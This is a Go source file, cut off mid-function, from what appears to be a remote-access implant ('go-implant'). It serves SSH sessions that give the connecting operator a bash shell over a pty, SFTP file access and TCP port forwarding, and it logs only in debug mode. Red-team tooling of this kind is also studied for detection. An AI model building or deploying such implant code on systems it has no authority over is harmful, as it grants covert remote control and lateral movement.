
// +build !windows

package ssh

import (
	"go-implant/client/config"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"os/exec"
	"sync"
	"syscall"
	"unsafe"

	"github.com/kr/pty"
	"golang.org/x/crypto/ssh"
)

func handleChannel(newChannel ssh.NewChannel) {

	isPortForward := false              // variable that tells whether this is a port forward or not
	reqData := DirectTcpipOpenRequest{} // struct to hold portforward arguments

	// Since we're handling a shell, we expect a
	// channel type of "session". The also describes
	// "x11", "direct-tcpip" and "forwarded-tcpip"
	// channel types.
	t := newChannel.ChannelType()
	if t == "direct-tcpip" {

		isPortForward = true

		// get extra data
		err := ssh.Unmarshal(newChannel.ExtraData(), &reqData)
		if err != nil {
			if config.DEBUG {
				log.Print("Got faulty extradata")
			}
			return
		}

	} else if t != "session" {
		newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t))
		return
	}

	// At this point, we have the opportunity to reject the client's
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		if config.DEBUG {
			log.Printf("Could not accept channel (%s)", err)
		}
		return
	}

	// Sessions have out-of-band requests such as "shell", "pty-req" and "env"
	c := make(chan *ssh.Request, 2) // create channel to pass messages regarding session to

	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				// We only accept the default shell
				// (i.e. no command in the Payload)
				if len(req.Payload) == 0 {
					req.Reply(true, nil)
				}

				go func() {
					defer connection.Close()
					serveTerminal(connection, c) // serve shell session
				}()

			case "subsystem":
				ok := false
				if string(req.Payload[4:]) == "sftp" {
					ok = true
				}
				req.Reply(ok, nil)

				go func() {
					defer connection.Close()
					defer connection.CloseWrite()
					handlesftp(connection) // serve sftp session
				}()

			// pty related messages, pass them along to the
			case "pty-req":
				c <- req // we have not created the pty yet, pass along

			case "window-change":
				c <- req // we have not created the pty yet, pass along
			}
		}
	}()

	// if this is portforward, serve portforward
	if isPortForward {
		ServePortForward(connection, reqData.HostToConnect, int(reqData.PortToConnect))
	}
}

// serve terminal to the client
func serveTerminal(connection ssh.Channel, oldrequests <-chan *ssh.Request) {

	// Fire up bash for this session
	bash := exec.Command("bash")

	// Prepare teardown function
	close := func() {
		_, err := bash.Process.Wait()
		if err != nil {